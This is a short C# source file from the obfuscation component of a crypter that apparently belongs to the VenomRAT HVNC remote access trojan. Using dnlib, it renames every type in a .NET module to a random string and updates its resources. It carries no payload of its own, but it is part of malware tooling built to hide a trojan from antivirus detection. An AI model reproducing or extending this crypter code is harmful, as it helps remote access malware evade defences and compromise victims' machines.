using System;
using dnlib.DotNet;
using VenomRAT_HVNC.Crypter.Settings;

namespace Client.Obfuscation.SimpleTechObfuscate;

public class Class
{
    public static void Obfuscate(ModuleDef md)
    {
        foreach (var type in md.GetTypes())
        {
            string encName = new GenerateKey(10).GenerateStrenghCharacter();
            Console.WriteLine($"{type.Name} -> {encName}");
            Ressources.Obfuscate(md, type.Name, encName);
            type.Name = encName;
        }

    }
}